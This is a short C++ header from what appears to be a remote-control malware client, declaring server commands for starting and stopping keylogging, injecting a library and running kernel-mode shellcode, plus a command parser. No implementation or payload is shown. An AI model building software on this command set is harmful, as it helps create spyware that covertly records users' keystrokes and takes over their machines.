#pragma once

#include "pch.h"

#include <stdexcept>
#include <map>
#include <string>

enum ServerCommand {
	StartKeylogging, EndKeylogging,
	InjectLibrary,
	RunKmShellcode
};

/*
	Parses responses from the server.
*/
ServerCommand ParseCommand(const std::string& Command, std::string* Output = nullptr);
